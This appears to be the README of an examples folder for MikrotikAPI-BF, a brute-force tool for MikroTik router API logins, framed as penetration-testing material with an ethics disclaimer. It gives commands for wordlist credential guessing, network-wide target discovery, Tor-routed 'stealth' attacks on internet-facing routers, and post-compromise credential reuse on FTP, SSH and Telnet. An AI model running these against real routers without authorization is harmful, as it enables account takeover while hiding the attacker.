# MikrotikAPI-BF Examples

This directory contains practical examples demonstrating different use cases of MikrotikAPI-BF.

## 📁 Files

### Basic Examples
- `example_basic.sh` - Simple single credential test
- `example_wordlist.sh` - Using username and password wordlists
- `example_combo.sh` - Using combo dictionary (user:pass)

### Advanced Examples
- `example_stealth.sh` - Stealth attack through Tor proxy
- `example_discovery.sh` - Network discovery + automated attacks
- `example_validation.sh` - Post-login service validation
- `example_config.sh` - Using YAML configuration file
- `example_export.sh` - Exporting results in multiple formats

### Wordlists
- `usernames.txt` - Sample username list
- `passwords.txt` - Sample password list
- `combos.txt` - Sample combo list (user:pass)
- `found_credentials.txt` - Sample of found credentials for validation

## 🚀 Usage

### Make scripts executable
```bash
chmod +x *.sh
```

### Run examples
```bash
# Basic attack
./example_basic.sh

# With wordlists
./example_wordlist.sh

# Stealth mode
./example_stealth.sh

# Network discovery
./example_discovery.sh
```

## ⚠️ Important Notes

1. **Legal Warning**: Only use these examples on systems you own or have explicit permission to test.

2. **Target Configuration**: Update the `-t` parameter in each script with your actual target IP.

3. **Wordlists**: The provided wordlists are samples. For real audits, use comprehensive wordlists like:
   - SecLists
   - RockYou
   - Custom generated lists

4. **Tor Setup**: For stealth examples, ensure Tor is installed and running:
   ```bash
   sudo apt install tor
   sudo service tor start
   ```

5. **Dependencies**: Install all requirements:
   ```bash
   pip install -r ../requirements.txt
   ```

## 📝 Creating Custom Examples

### Template
```bash
#!/bin/bash

echo "=== My Custom Example ==="

python ../mikrotikapi-bf.py \
  -t YOUR_TARGET \
  -d YOUR_WORDLIST \
  --YOUR_OPTIONS

echo "Done!"
```

### Common Options
```bash
# Performance
--threads 5          # Use 5 concurrent threads
--seconds 3          # Wait 3 seconds between attempts
--timeout 10         # Connection timeout

# Output
--progress           # Show progress bar
--export json,csv    # Export results
-v                   # Verbose mode
-vv                  # Very verbose (debug)

# Proxy
--proxy socks5://127.0.0.1:9050  # Use Tor
--proxy http://proxy:8080         # Use HTTP proxy

# Validation
--validate ftp,ssh,telnet         # Test services
```

## 🎯 Real-World Scenarios

### Scenario 1: Internal Network Audit
```bash
# 1. Discover all Mikrotik devices
python ../mikrotik-discovery.py -n 10.0.0.0/8 -o internal_targets.json

# 2. Test weak passwords
python ../mikrotikapi-bf.py -t $(jq -r '.devices[0].ip' internal_targets.json) \
  -u users.txt -p common_passwords.txt --export csv
```

### Scenario 2: Internet-Facing Router
```bash
# Through Tor for anonymity
python ../mikrotikapi-bf.py \
  -t public.target.com \
  -d large_combos.txt \
  --proxy socks5://127.0.0.1:9050 \
  --threads 1 \
  --seconds 15 \
  --max-retries 3
```

### Scenario 3: Post-Compromise Validation
```bash
# After finding credentials, test on other services
python ../mikrotikapi-bf.py \
  -t 192.168.1.1 \
  -U admin \
  -P found_password \
  --validate ftp,ssh,telnet,http \
  --export-all
```

## 🐛 Troubleshooting

### Connection Timeout
```bash
# Increase timeout
--timeout 15
```

### Proxy Issues
```bash
# Test proxy first
curl --proxy socks5://127.0.0.1:9050 https://check.torproject.org
```

### Too Many Errors
```bash
# Enable circuit breaker
--circuit-breaker

# Or reduce threads
--threads 1
```

## 📚 Learning Resources

- [Mikrotik RouterOS Manual](https://wiki.mikrotik.com/)
- [OSCP Preparation](https://www.offensive-security.com/pwk-oscp/)
- [Pentesting Networks](https://pentestbook.six2dez.com/)

## 🤝 Contributing

Have a cool example? Submit a PR with:
1. Shell script with clear comments
2. Expected output description
3. Security considerations

## 📄 License

These examples are released under the same MIT license as the main project.

## ⚠️ Ethical Guidelines

- ✅ Test on authorized targets only
- ✅ Document all findings properly
- ✅ Report vulnerabilities responsibly
- ❌ Never attack without permission
- ❌ Don't share unauthorized access
- ❌ Respect privacy and data laws

